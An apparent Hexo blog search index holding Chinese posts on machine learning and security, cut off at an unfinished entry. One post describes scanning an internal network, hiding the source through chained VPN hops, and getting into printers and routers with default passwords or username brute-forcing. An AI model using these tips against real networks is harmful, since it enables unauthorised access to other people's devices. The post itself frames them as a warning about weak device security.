<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[人工智能赋能安全应用案例集(相关资料分享)]]></title>
    <url>%2F2021%2F03%2F04%2F20210304-%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E8%B5%8B%E8%83%BD%E5%AE%89%E5%85%A8%E5%BA%94%E7%94%A8%E6%A1%88%E4%BE%8B%E9%9B%86(%E7%9B%B8%E5%85%B3%E8%B5%84%E6%96%99%E5%88%86%E4%BA%AB)%2F</url>
    <content type="text"><![CDATA[分享一些最近看到的相关资料 人工智能赋能安全应用案例集.pdf 下载 人工智能安全白皮书2020.pdf 下载 AI安全白皮书-华为-ai-security-white-paper-cn.pdf 下载 404师傅经典项目：https://github.com/404notf0und/AI-for-Security-Learning 人工智能赋能安全应用案例集]]></content>
      <categories>
        <category>Sec</category>
      </categories>
      <tags>
        <tag>AI</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[手撕BackPropagation (BP_Neural_Network)]]></title>
    <url>%2F2020%2F12%2F12%2F20201212-%E6%89%8B%E6%92%95BackPropagation-BP-Neural-Network%2F</url>
    <content type="text"><![CDATA[深度学习基础；反向传播； 手撕一下推导过程。 0x00 BP神经网络结构 输入层，隐藏层（神经元）*，输出层。 一种简单的示例结构: 其实理解神经网络的计算过程，计算图是最合适的。参考[2] 0x01 梯度&amp;链式法则梯度 神经网络常常采用随机梯度下降的方法，来使得损失降低，参数逼近最优解。 所以，梯度是什么？ 损失函数对参数的导数 {\frac{∂C_{}}{∂w_{1}}}、{\frac{∂C_{}}{∂b_{1}}}、{\frac{∂C_{}}{∂w_{2}}}、{\frac{∂C_{}}{∂b_{2}}}、... 参数的梯度乘以学习率就是该参数所需要更新(+/-)的值。 链式法则 微积分的重要定理，示例如下 0x02 整体流程 正向传播，根据input计算出output，与此同时呢，会计算和记录当前的中间变量，以便反向传播时不必重复计算。 根据损失函数计算误差，记为 C (cost)。 反向传播，反向计算并记录，以便更新每一层的权重， θ = \{w_1,b_1,w_2,b_2,...,w_{n-1},b_{n-1},w_{n},b_{n}\} w^1 = w^0-lr*{\frac{∂C_{}}{∂w_{1}}} b^1 = b^0-lr*{\frac{∂C_{}}{∂b_{0}}}其中，lr是自定义的学习率。所以问题就是求参数对损失函数的微分，这一步就需要使用求微分的链式法则。 如图一所示，我们要求w1对C的偏导，就需要根据路径，根据计算图，链式的去求解。 {\frac{∂C_{}}{∂w_{1}}} = {\frac{∂C_{}}{∂w_{1}}}但其实这更容易被理解成正向传播，所以我个人喜欢这么表示（具体原因下一部分会讲）: {\frac{∂C_{}}{∂w_{1}}} = {\frac{∂C_{}}{∂w_{1}}} 现代神经网络一般分为两步，求梯度，梯度更新。(参考[3]) 以pytorch举例 loss.backward() 反向传播 backward()会根据tensor的requires_grad属性（true\false）计算梯度。 其他需要的数据在forward时已经存储。 optimizer.step() 优化器更新参数。 以下部分将进行详细说明 正向传播首先，我们需要知道，直接正向传播来求，可不可以 在某种意义上是可以的，只要运算完成，根据存储的大量中间量以及最终结果，运用链式法则肯定是可以算的，那为什么还需要反向传播呢。 首先来看正向传播怎么算，这里把网络加一层 下边两个图都展示了，正向传播直接计算的话，中间变量重复性极大，每次都要计算的这些重复算式的话，计算量冗余太大，这就是正向传播，类似于正向搜索的弊端。 反向传播 因为正向传播的缺点，所以要介绍反向传播的解决方式 反向传播，从根传点往回传，每个结点内求和后继续传，直到叶结点停止，叶结点的值内求和即为梯度。 单个纯手推 那么另外，为什么需要正向传播记录的中间变量，也就是一些中间输出值呢。 图-6.2中李宏毅老师表示的比较清楚，计算梯度需要两部分，${\frac{∂C_{}}{∂w_{}}}={\frac{∂z_{}}{∂w_{}}}*{\frac{∂C_{}}{∂z_{}}}$；其中第一部分${\frac{∂z_{}}{∂w_{}}}$是需要正向传播过程中计算并且记录的，推导一下的话也就是一些中间输出；第二部分${\frac{∂C_{}}{∂z_{}}}$才是反向传播中计算的。 通用推导 损失函数 训练的目的呢，就是要减小我们的训练误差，而误差呢，一般都是由自己定义或选择的一种函数，用来表示预测值与真实值之间的差距。 基于向量的反向传播 基于标量的推到可能还算简单，但是真正运用到实际的向量运算中可能就有麻烦了。这里我们以CS231n的课后作业举例，其比较具有代表性。 参考资料 如何直观地解释 backpropagation 算法？ - YE Y的回答 - 知乎 如何直观形象的理解方向导数与梯度以及它们之间的关系？ ∂x Δx dx？: 知乎 台大李宏毅！1. 李宏毅主页 2. Youtube]]></content>
      <categories>
        <category>AI</category>
      </categories>
      <tags>
        <tag>AI</tag>
        <tag>CNN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一次内网资产扫描]]></title>
    <url>%2F2020%2F11%2F17%2F20201117-%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E8%B5%84%E6%BA%90%E6%89%AB%E6%8F%8F%2F</url>
    <content type="text"><![CDATA[简单的扫描一下内网有没有可以资产，具体极其敏感的结果还是有的，但本文肯定不进行公布，只是记录。 0x00 工具 ： Advanced IP Scanner 0x01 隐身策略 尽量使用VPN进入，多跳几次更佳。 0x02 资源利用 像这种Web界面或者IP Scanner直接告知机型的设备，默认管理员密码就可以进入很多设备，而且一般都是最高权限。 iR-ADV 6075 佳能打印机 可爆破 用户名爆破 可爆破，无验证码及次数 用户名爆破 大多数是一些打印机之类的，一些路由器也都是直接默认弱密码，但是主要的网关防护都不错，比较统一。有一些摄像头或者资料等敏感性太强，无法上传；我本人是很震撼的，以至于我也不敢再继续探测下去了；信息安全在如今已经经常被提起和注意了，但是还是存在诸多诸多的问题。信息安全，刻不容缓啊。 0x03 思考 很多截图没法上传，本文章仅作为警示作用，所有截图都已确认脱敏。 暴露的资产一般是一些比较老旧的资源，和低价值的打印机之类的。这可能与近些年来信息安全意识逐步提高有关系。不过同时也存在着一些高危漏洞，极高风险的。 只要是暴露在网络环境中的资产，不管是公网还是局域网，都应该做好防护，关闭不必要的端口，是用强密码。避免使用弱密码。 据爆料某手机公司刚刚公司内网被映射，很可怕。 另外，很多网络摄像头直接映射到公网，而且还是弱密码，一定注意信息安全呀。 参考资料 Advanced-Ip-Scanner 利用ZoomEye快速查找Hikvision网络摄像头 CVE-2018-18778 mini_httpd任意文件读取漏洞]]></content>
      <categories>
        <category>Sec</category>
      </categories>
      <tags>
        <tag>Sec</tag>
        <tag>Advanced IP Scanner</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[手推SVM]]></title>
    <url>%2F2020%2F11%2F12%2F20201112-%E6%89%8B%E6%8E%A8SVM%2F</url>
    <content type="text"><![CDATA[间隔；对偶；核技巧； 手推SVM； 整里SVM相关问题； Large-Margin Linear Classification 最大间隔线性分类器 决策函数为 $f(x) = sign(\omega^{}x+b^{})$ 推导过程因为本人写字习惯斜着，所以比较乱。对此表示抱歉。附录里会放一张整体的推导过程图片，比较清晰。 整体推导图 0x01 间隔1-1 硬间隔基本硬间隔的优化表示 展开 将后边部分缩放为1，再经过变形之后得到： 整理一下，原问题为： 带约束的不好优化，所以引入拉格朗日乘子 原问题就没有了w,b的约束，再因为原问题具有强对偶性，求解原问题等价于求解对偶问题，所以转化为对偶问题 下一步，利用凸优化的特性求解最小化的拉格朗如对偶问题 得到 最后结合KKT条件解除最终解 1-2 软间隔由于很多情况下数据集中存在噪声等情况，无法求解到最终解，所以引入了含有噪声的优化函数。 Quadratic Programming 二次规划问题 SVM的分类结果只与支持向量有关，除了支持向量以外，其他的系数均为0. 这也是SVM高效的原因。 0x02 拉格朗日对偶性目的在于不求解带有约束的原问题，通过引入拉格朗日乘子的方式来直接求解。第一节中已经说明，从label处开始。 0x03 核技巧把输入数据映射到一个新的(更高维)的特征空间，本质思想类似于加入非线性 具体实现在于将原公式中的内积替换成核函数 RBF 0x04 SMO 序列最小化优化QP问题最坏时间复杂度为$O(N_{3})$，我们要做的就是利用优化算法尽量避免最坏时间复杂度。 将原N的参数的问题分解为2个2个的子问题，直到全部满足KKT条件为止。 因为子问题存在解析解，所以就算子问题很多，整体上也是加速效果。 合页损失，随机SVM 合页损失 hinge loss，看起来比较像relu，$max{0, 1-y_{i}(\omega·x+b)}$ 最后这一部分比较乱，大体理解SMO思想即可。 参考资料 猫都能看懂的SVM【从概念理解、优化方法到代码实现】 机器学习-白板推导系列(六)-支持向量机SVM（Support Vector Machine） 附录整体推导过程]]></content>
      <categories>
        <category>AI</category>
      </categories>
      <tags>
        <tag>AI</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[My First SCI - An Intrusion Detection Method Based on Decision Tree-Recursive Feature Elimination in Ensemble Learning]]></title>
    <url>%2F2020%2F10%2F23%2F20201023-My%20First%20SCI%20-%20An%20Intrusion%20Detection%20Method%20Based%20on%20Decision%20Tree-Recursive%20Feature%20Elimination%20in%20Ensemble%20Learning%2F</url>
    <content type="text"><![CDATA[https://doi.org/10.1155/2020/2835023； An Intrusion Detection Method Based on Decision Tree-Recursive Feature Elimination in Ensemble Learning https://doi.org/10.1155/2020/2835023]]></content>
      <categories>
        <category>AI</category>
      </categories>
      <tags>
        <tag>AI</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[从决策树，随机森林，到XGBoost]]></title>
    <url>%2F2020%2F10%2F01%2F20201001-%E4%BB%8E%E5%86%B3%E7%AD%96%E6%A0%91%EF%BC%8C%E9%9A%8F%E6%9C%BA%E6%A3%AE%E6%9E%97%EF%BC%8C%E5%88%B0XGBoost%2F</url>
    <content type="text"><![CDATA[树类模型的发展与总结 0x01 决策树1-1 整体技术根据条件概率分布——判别模型 本质在于归纳出一组分类规则 求解方法一般为正则化的极大似然函数 决策树生成方法为递归的选择最优特征 过拟合-剪枝 —&gt; 1-3 剪枝 特征选择 决策树的生成 剪枝 1-1 需要用到的公式假设随机变量X的概率分布为 P(X = x_{i}) = p_{i}, i = 1,2,...,n假设有随机变量(X, Y)，其联合概率分布为 P(X = x_{i}, Y = y_{i}) = p_{ij}, i = 1,2,...,n; j = 1,2,...,m熵 表示随机变量不确定性的程度 H(X) = -\sum_{i = 1}^{n}p_{i}log_{2}{p_{i}} H(X) = -\sum_{i = 1}^{n}p_{i}log_{e}{p_{i}}以2为底，最后单位为bit；以e为底，最后单位为nat； 熵与X的值无关，而与X的分布有关，所以可以记为 H(X) = -\sum_{i = 1}^{n}p_{i}log_{2}{p_{i}}条件熵 H(Y|X) = \sum_{i = 1}^{n}p_{i}H(Y|X = x_{i})经验熵和经验条件熵就是当熵和条件熵中的概率是由数据估计得到时，对应的熵和条件熵 经验熵 假设数据集为D，$|C_{k}|$表示第k类的样本数 H(D) = \sum_{k = 1}^{K}\frac{|C_{k}|}{|D|}log_{2}{\frac{|C_{k}|}{|D|}}经验条件熵 $D_{i}$表示因为特征A所划分的数据子集，$|D_{ik}|$表示$|D_{i}|$中属于第k类的数量 H(D|A) = \sum_{i = 1}^{n}\frac{|D_{i}|}{|D|}\sum_{k = 1}^{K}\frac{|D_{ik}|}{|D|}log_{2}{\frac{|D_{ik}|}{|D|}}信息增益 信息增益表示得知X的概率使得对Y的不确定性的减小程度 g(D,A) = H(D) - H(D|A)信息增益比 g_{R}(D,A) = \frac{g(D,A)}{H(D)}基尼指数 Gini(p) = \sum_{k = 1}^{n}p_{k}(1-p_{k}) = \sum_{k = 1}^{n}1-p_{k}^{2} Gini(D) = \sum_{k = 1}^{n}1-{\frac{|C_{k}|}{|D|}}^{2}条件基尼指数 Gini(D, A) = \sum_{k=1}^{K}\frac{|D_{k}|}{|D|}Gini(D_{k}) Gini(D, A) = \frac{|D_{1}|}{|D|}Gini(D_{1})+\frac{|D_{2}|}{|D|}Gini(D_{2})1-2 ID3 C4.5 CARTID3算法 选择信息增益最大的特征作为节点的特征，由该特征的不同取值建立子节点，再对子节点循环调用 ID3相当于用极大似然法进行概率模型的选择 C4.5是ID3的改进，使用信息增益比 这两种算法只有生成，没有剪枝，容易过拟合 需要预剪枝 —&gt; 1-3 剪枝 剪枝使用损失函数来进行，考虑决策树的复杂度 CART算法 classification and regression tree 先生成尽可能大的决策树（完全生长），用验证集进行剪枝并选择最优子树 基尼指数 计算每种特征及特征中每种取值下的基尼指数，例如 $A$ 特征下 $a_{1},a_{2},…,a_{A}$ 计算量变大了 结束条件 样本数量小于阈值 样本集基尼指数小于阈值（样本集中样本基本属于同一类） 没有更多特征 1-3 CART回归回归需要特别拿出来说要下，因为其他两个只能进行分类 1-4 剪枝后剪枝 CART 一般采用递归的方式 $g(t)=\frac{C(t)-C(T_{t})}{\left|t\right|-1}$ $T_{0}$中减去g(t)值最小的子树$T_{t}$就为$T_{1}$，这个最小的g(t)就为$\alpha_{1}$，之后不断剪枝，$\alpha$不断增大，就获得了$\alpha$区间和子树集合。 下一步利用交叉验证选取最好的子树，这一过程也就选择了最好的$\alpha$ 预剪枝 ID3 C4.5 0x02 GDBT0x03 XGBoost]]></content>
      <categories>
        <category>AI</category>
      </categories>
      <tags>
        <tag>ML</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[概率与统计 （分布、熵）]]></title>
    <url>%2F2020%2F09%2F09%2F20200909-%E6%A6%82%E7%8E%87%E7%BB%9F%E8%AE%A1%2F</url>
    <content type="text"><![CDATA[概率 统计 相关基本知识； 会学习写边补充。]]></content>
      <categories>
        <category>AI</category>
      </categories>
      <tags>
        <tag>AI</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[特征工程 & word2vector & L1 L2 正则 & (Batch) Normalization]]></title>
    <url>%2F2020%2F08%2F18%2F20200818-%E7%89%B9%E5%BE%81%E5%B7%A5%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[数据和特征，往往决定了结果的上限； 而算法和优化通常是为了接近这个上限。 0x01 归一化 Normalization 无量纲 ： 无物理单位 (比如比值等) 适合： 线性回归，逻辑回归LR，SVM, BP神经网络 不适合：决策树类（信息增益比 与是否归一化无关） 1-1 归一化 等比缩放 ${x^{’} =\frac{x-min(x)}{x_{max}-x_{min}},x\in[0,1]}$ 均值归一化 mean normalization $x^{’} =\frac{x-mean(x)}{x_{max}-x_{min}}, x\in[-1,1]$ 缩放到单位长度 scaling to unit length $x^{’} =\frac{x}{||x||}$ , $||x||$是欧几里得长度 L2范数（平滑，非稀疏）：$\left | x \right |_{2} = \sqrt{\sum_{i=1}^{n}\left | x_{i} \right |^2} = \sqrt{x_{1}^2+x_{2}^2+…+x_{n}^2}$ 欧几里得距离 本文第四部分 （L1范数，L2范数） 将详细介绍 零均值归一化（标准化） 映射到均值为0，标准差为1的分布上。 均值μ，标准差σ： z = \frac{x-\mu}{\sigma} 标准差的存在也是为了消除量纲影响，方差的量纲与数据的量纲不一致。具体概率分布等详细知识可以参考我之后的文章 概率统计中的相应部分。 为什么要归一化 同样学习率的情况下，在各特征维度上的梯度更新更加一致，能够更快的收敛。使不同量纲的特征处于同一数值量级，减少方差大的特征的影响，使模型更准确。 比如LR, BP神经网络等 其他数据缩放方式：cnblogs: 数据预处理方法 1-2 标准化 归一化是标准化的方法之一 一般将零均值归一化称为标准化。 1-3 Batch Normalization 《Batch Normalization: Accelerating Deep Network Training by Reducing Internal Covariate Shift》 BN work的根本原因，是因为在网络的训练阶段，其能够让优化空间（optimization landscape）变的平滑。 Batch Normalization位于激活函数之前，这样就可以使数据的分布更加适合非线性激活，避免落入激活函数不敏感区域，即梯度消失的问题。 BN可以防止梯度爆炸或弥散、可以提高训练时模型对于不同超参（学习率、初始化）的鲁棒性、可以让大部分的激活函数能够远离其饱和区域。 论文 对于没有BN的神经网络，其loss函数是不仅非凸，并且还有很多flat regions、sharp minimal。这就使得那些基于梯度的优化方法变得不稳定，因为很容易出现过大或者过小的梯度值。观察上图，可以发现，在使用了BN后，loss的变化变得更加稳定，不会出现过大的跳动；同样，梯度也变得更加平滑。 0x02 编码与处理编码 按一定顺序序号编码，一定程度可以保留大小信息。 One-Hot 独热编码，很熟悉了，但有问题要注意 需要整理节省存储空间，利用稀疏性，使用稀疏向量节省空间。 需要降维 KNN等高维空间下距离不好测算 LR等回过拟合 不是所有维度都是有效的，只有部分维度也就是部分特征是有效的。 编码，节省空间 hash trick等 组合特征与降维 矩阵分解 (m, n) = (m, k) x (k, n) 形象上类似于encoder-decoder word2vector LDA T-SNE 相对熵 KL散度 详见之后文章 降维算法 文本特征0x03 Word2Vector 【!】3-1 CBOW与Skip-gram 看图Word2Vector的原理就已经很好理解了， 需要注意的是，Word2Vector采用权重共享的方式， 其中CBOW方式的输入层参数权重共享很好理解，求和而已； 而Skip-gram采用的则是TOP-K的方式，输出最高的top-k个预测结果来表示上下文； 因为Word2Vector的上下文是词袋类型，是无序的。 3-2 优化softmax需要注意的是，以下两种方法，优化的是softmax这个输出过程，而不是softmax本身，这两种方法都与softmax无关。 3-2-1. 层次softmax使用了树形结构，非叶节点相当于一个神经元（sigmoid），起分类作用； 每个叶子节点代表语料库中的一个词语，于是每个词语都可以被01唯一地编码，并且其编码序列对应一个事件序列； 而树则选择了哈夫曼树，因为Huffman编码中词频越高的词语对应的编码越短，特别适合word2vec的训练。 哈夫曼树很简单。每次从许多节点中，选择权值最小的两个合并，根节点为合并值；依次循环，直到只剩一棵树。 label会编程哈夫曼编码， 训练阶段不需要所有叶节点都输出，所以训练阶段平均只需要logN个节点即可， 预测阶段则需要所有节点。 sigmoid: S(x) = \frac{1}{1+e^{-x_{}}}softmax 又称归一化指数函数: S(x) = \sum_{i=1}^{n}\frac{e^x}{e^{x_{i}}}Sigmoid 输出结果是伯努利分布 而Softmax输出的是多项分布 同样都是二分类的情况下，两者时等价的， 有人说sigmoid会输出两个值，但是这两个值只是两次结果而已，不具有可加性，而且，应该是网络的设计问题，sigmoid的全连接只需要(n,1)即可，那就只有一个值了，而softmax需要(n, 2)，输出两个值。 各叶子节点概率值相加为1: P.S. 一般二分类模型做多分类的话都会采用树形结构，比如SVM多分类器就是树形结构， 3-2-2. 负采样 Negative Sampling简称NEG, 目的是用来提高训练速度和改善所得词向量的质量 NEG不使用复杂的哈夫曼树，而是使用随机负采样，大幅度提高性能 NCE 细节有点复杂，本质上是利用已知的概率密度函数来估计未知的概率密度函数。简单来说，如果已知概率密度X，未知Y，如果知道X和Y的关系，Y也就求出来了。 在训练的时候，需要给正例和负例。Hierarchical Softmax是把负例放在二叉树的根节点上，而NEG，是随机挑选一些负例。 负采样的本质：每次让一个训练样本只更新部分权重，其他权重全部固定；减少计算量；（一定程度上还可以增加随机性） 样本少了，逻辑回归，似然函数，随机梯度上升 0x04 L1范数，L2范数 【!】 范数 通用公式： \left \| x \right \|_{p} = (\sum_{i=1}^{n}\left | x_{i} \right |^p)^{\frac{1}{p}}L0范数： 表示向量中所有非零元素的个数，其非常适合机器学习中稀疏编码 L1范数（稀疏）： \left \| x \right \|_{1} = \sum_{i=1}^{n}\left | x_{i} \right | L1范数是指向量中各个元素绝对值之和，也有个美称叫“稀疏规则算子”（Lasso regularization）。L1范数和L0范数可以实现稀疏，L1因具有比L0更好的优化求解特性而被广泛应用。 L2范数（平滑，非稀疏） 欧几里得距离 \left \| x \right \|_{2} = \sqrt{\sum_{i=1}^{n}\left | x_{i} \right |^2} = \sqrt{x_{1}^2+x_{2}^2+...+x_{n}^2} ​ 图4-1 L1 和 L2 范数在机器学习上最主要的应用大概分下面两类 作为损失函数使用 作为正则项使用也即所谓 L1-regularization 和 L2-regularization 4-1 损失函数L1: least absolute deviation (LAD，最小绝对偏差) 绝对值阻碍计算，但鲁棒性 (Robust) 更强，对异常值更不敏感。 L2: $ S = \sum_{i=1}^{n}（y_{i} - f(x_{i})）^2$ 最小二乘误差 (least squares error, LSE) 求导、解方程等容易计算，比较常用 另外，L2 一定只有一条最好的预测线，L1 则因为其性质可能存在多个最优解（图4-1即可解释） 详细参考资料 4-2 正则 L1-regularization 和 L2-regularization 先说特点和优缺点： 如上面提到的，L2 计算起来更方便，而 L1 在特别是非稀疏向量上的计算效率就很低； L2 有唯一解，而 L1 不是； L1 最重要的一个特点，输出稀疏，会把不重要的特征直接置零，而 L2 则不会； L1 天然的输出稀疏性，把不重要的特征都置为 0，所以L1也是一个天然的特征选择器。 4-3 L1 稀疏性 （画图 和 导数 两钟方式进行解释）4-3-1 导数 能看出来，w越接近0时，L1始终为正负1，而L2则越来越小，一直是一个趋势。这也是为什么L1输出容易稀疏，L2很难稀疏的原因。 在梯度更新时，不管 L1 的大小是多少（只要不是0）梯度都是1或者-1，所以每次更新时，它都是稳步向0前进。 而看 L2 的话，就会发现它的梯度会越靠近0，就变得越小。 也就是说加了 L1 正则的话基本上经过一定步数后很可能变为0，而 L2 几乎不可能，因为在值小的时候其梯度也会变小。于是也就造成了 L1 输出稀疏的特性。 4-3-2 画图图像上也能类似于上边看出来， L1一般相切与坐标轴，也就是有一维为0的点，也就是稀疏； 而L2两个坐标都很难为0，所以不稀疏，也就是平滑。 0x05 其他思考5-1 图嵌入（Graph embedding）知乎：图嵌入（Graph embedding）- 简介 知乎：为什么要进行图嵌入（Graph embedding）？ 5-2 LDA与word2vector 关键点在于似然函数不同 LDA是概率图生成模型，似然函数是概率乘积； w2v似然函数则是与神经网络输出有关，loss的反向传播，也就是深度学习常用的交叉熵。 5-3 似然函数 交叉熵 异曲同工 在之后的文章在讲吧，还有T-SNE的相对熵之类的 参考文献 什么是批标准化 (Batch Normalization) Word2vec之数学模型 l1正则与l2正则的特点是什么，各有什么优势？Andy Yang的回答 层次softmax (hierarchical softmax）理解 Youtube: Q&amp;A - Hierarchical Softmax in word2vec - ChrisMcCormickAI word2vec原理(三) 基于Negative Sampling的模型]]></content>
      <categories>
        <category>AI</category>
      </categories>
      <tags>
        <tag>AI</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[模型评价]]></title>
    <url>%2F2020%2F07%2F22%2F20200722-%E6%A8%A1%E5%9E%8B%E8%AF%84%E4%BB%B7%E6%8C%87%E6%A0%87%2F</url>
    <content type="text"><![CDATA[常用的模型评价指标以及他们的一些问题 0x01 常用指标混淆矩阵 Confusion Matrix T和F表示预测结果是True还是False，P和N则表示正样本和负样本。 TP表示正样本被预测正确的数目，TN表示负样本被预测正确的数目。 FP表示正样本被预测为负样本的数目，FN表示负样本被预测为正样本的数目。 sklearn的混淆矩阵示例是一个三分类，所以考虑了多分类的混淆矩阵应该怎么表示。 混淆矩阵M的每一行表示真实的类，每一列表示预测的类。 重点关注混淆矩阵的对角线区域，它表示实际类别和预测类别相一致，即TP区域。 准确率 公式 ：$ Accuracy = \frac{n_{correct}}{n_{total}} $ 预测正确的占全部比例，最简单的指标 精确率 公式 ：$Precision = \frac{TP}{TP+FP}$ “你认为是对的里，有多少是对的” 召回率 公式 ：$Recall = \frac{TP}{TP+FN}$ “所有对的里，你找到了多少” 精确率和召回率是一对欢喜冤家 Precision值和Recall值是既矛盾又统一的两个指标，为了提高Precision值，分类器需要尽量在“更有把握”时才把样本预测为正样本，但此时往往会因为过于保守而漏掉很多“没有把握”的正样本，导致Recall值降低。反之亦然。 基于以上特点，就出现了F1-Score评价指标。 F1-Score F1 = \frac{2*precision*recall}{precision+recall}=\frac{2}{\frac{1}{precision}+\frac{1}{recall}} 从公式的后半部分可以看出，F1-Score的目的就是同时提高精确率和召回率。 P-R 曲线 （附图右图） 横坐标为召回率，纵坐标为精确率 根据不同阈值下获得的每一个结果作为每一个点，绘制曲线图。（存在先排序，切分坐标系，直接填结果的画图方式，不需要不同阈值反复统计） FPR 误报率 假阳性率（False Positive Rate，FPR） 假的里有多少被判为真了 FPR = \frac{FP}{N} = \frac{FP}{FP + TN} TPR 检出率 真阳性 率（True Positive Rate，TPR） 真的里有多少检测出来了 TPR = \frac{TP}{P} = \frac{TP}{TP + FN} ROC 曲线 （附图左图） 横坐标FPR，纵坐标TPR 同样根据不同阈值下的预测结果来确定FPR TPR，即一对坐标 Receiver Operating Characteristic Curve | 受试者工 作特征曲线 起源见附录 AUC Aera Under Curve，曲线下的面积 AUC越大，说明分类器越可能把真正的正样本排在前面，分类性能越好。 ROC曲线 P-R曲线区别 ROC曲线能够尽量降低不同测试集带来的干扰，更加客观地衡量模型本身的性能。 若选择不同的测试集，P-R曲线的变化就会非常大，而ROC曲线则 能够更加稳定地反映模型本身的好坏。ROC曲线的适用场景更多，被广泛 用于排序、推荐、广告等领域。 如果研究者希望更多地看到模型在特定数据集上的表现，P-R曲线则能够更直观地反映其性能。 MSE 均方误差 (Mean Squared Error ) RMSE 平方根误差 容易受离群点(Outlier)影响 离群点要么过滤，要么加入建模(复杂)，要么使用其他误差评估指标，比如MAPE MAE (Mean Absolute Error) 平均绝对误差是绝对误差的平均值 MAPE 标准差 SD 马修斯相关系数 —- MCC MCC = \frac{TP*TN-TP*FN}{\sqrt{(TP+FP)*(TP+FN)*(TN+FP)*(TN+FN)} } “马修斯相关系数 —- MCC 主要用于衡量二分类问题，其综合考虑了 TP TN, FP , FN， 是一个比较均衡的指标， 对于样本不均衡情况下也可以使用。MCC的取值范围在 [-1, 1]， 取值为1 表示预测与实际完全一致， 取值为0表示预测的结果还不如随机预测的结果， -1 表示预测结果与实际的结果完全不一致。因此我们看到， MCC 本质上描述了预测结果与实际结果之间的相关系数。” 0x02 模型评估方法 Holdout检验 正常划分 训练集验证集 交叉检验 k-fold交叉验证 留一验证（留P验证） 必须进行$C^{P}_{N}$次训练和验证 自助法 又放回抽取N次抽取 当N趋近去无穷大时，未被抽取的概率： 某一个样本N次都未被抽取的改率 $(1-\frac{1}{n})^{n}$ 根据重要极限$\lim_{x \to \infty} (1+\frac{1}{n})^{n} = e$ 最终结果等于$\frac{1}{e}$，约等于0.368 0x03 过拟合 欠拟合统计学习方法里说过，模型能够学习的必要条件，就是存在绝对误差下届，也是拟合的前提。 解决过拟合 更多数据（保证质量） 降低模型复杂度，减少参数 正则化 集成学习 解决欠拟合 的反方法。 0x04 其他问题4-1 调参方法 网格搜索 全局搜索，可以调整步长跳跃尝试，但目标函数通常非凸，容易跳过最优点 随机搜索 贝叶斯优化 会根据先验分布假设搜集函数，根据后验分布，给出最优值可能的点 容易陷入局部最优，会尝试新区域继续探索或者该区域继续利用 Google Vizier ACCESS审稿过一篇文章说过一种调参方法 The Slap Swarm Algorithm (SSA) is a heuristic algorithm that simulates the foraging of slaps in the biological world [28]. “ There should be “salp” instead of “slap”. AutoML/DL 4-2 余弦相似度 余弦相似度 余弦距离 4-3 A/B测试独立 互不影响 无偏 随机抽取 参考文献 精确率，召回率，F1值的通俗解释 《百面机器学习》 《统计学习方法》 【机器学习】均方误差(MSE)和均方根误差(RMSE)和平均绝对误差(MAE) python实现混淆矩阵 附图： 附录： ​ ROC曲线最早是运用在军事上的，后来逐渐运用到医学领域，并于20世纪80年代后期被引入机器学习领域。相传在第二次 世界大战期间，雷达兵的任务之一就是死死地盯住雷达显示器，观察是否有敌机来袭。理论上讲，只要有敌机来袭，雷达屏幕上 就会出现相应的信号。但是实际上，如果飞鸟出现在雷达扫描区域时，雷达屏幕上有时也会出现信号。这种情况令雷达兵烦恼不 已，如果过于谨慎，凡是有信号就确定为敌机来袭，显然会增加误报风险；如果过于大胆，凡是信号都认为是飞鸟，又会增加漏 报的风险。每个雷达兵都竭尽所能地研究飞鸟信号和飞机信号之间的区别，以便增加预报的准确性。但问题在于，每个雷达兵都 有自己的判别标准，有的雷达兵比较谨慎，容易出现误报；有的雷达兵则比较胆大，容易出现漏报。 为了研究每个雷达兵预报的准确性，雷达兵的管理者汇总了所有雷达兵的预报特点，特别是他们漏报和误报的概率，并将 这些概率画到一个二维坐标系里。这个二维坐标的纵坐标为敏感性（真阳性率），即在所有敌机来袭的事件中，每个雷达兵准确 预报的概率。而横坐标则为1-特异性（假阳性率），表示在所有非敌机来袭信号中，雷达兵预报错误的概率。由于每个雷达兵的 预报标准不同，且得到的敏感性和特异性的组合也不同。将这些雷达兵的预报性能进行汇总后，雷达兵管理员发现他们刚好在一 条曲线上，这条曲线就是后来被广泛应用在医疗和机器学习领域的ROC曲线。]]></content>
      <categories>
        <category>AI</category>
      </categories>
      <tags>
        <tag>AI</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[不讲道理的BERT]]></title>
    <url>%2F2020%2F07%2F07%2F20200707-%E4%B8%8D%E8%AE%B2%E9%81%93%E7%90%86%E7%9A%84BERT%2F</url>
    <content type="text"><![CDATA[不管三七二十一直接上BERT的BERT；]]></content>
      <categories>
        <category>AI</category>
      </categories>
      <tags>
        <tag>NLP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[恶意代码分析 - malware analysis]]></title>
    <url>%2F2020%2F06%2F01%2F20200601-%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[恶意代码分析与检测 0x00 PE文件结构0x01 静态分析1. 常用工具 SdutyPE PEID PEView IDA Pro 2. 动态链接库注意一些常用的动态链接库，比如 ws2_32.dll是Windows Sockets应用程序接口， 用于支持Internet和网络应用程序。 0x02 动态分析]]></content>
      <categories>
        <category>Sec</category>
      </categories>
      <tags>
        <tag>Reverse</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[从CNN，VGG，Inception，ResNet，到EfficientNet]]></title>
    <url>%2F2020%2F05%2F20%2F20200520-%E4%BB%8ECNN%EF%BC%8Cvgg%EF%BC%8Cinception%EF%BC%8Cresnet%EF%BC%8C%E5%88%B0EfficientNet%2F</url>
    <content type="text"><![CDATA[CNN类模型的发展与总结；]]></content>
      <categories>
        <category>AI</category>
      </categories>
      <tags>
        <tag>CNN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[大数据相关整理]]></title>
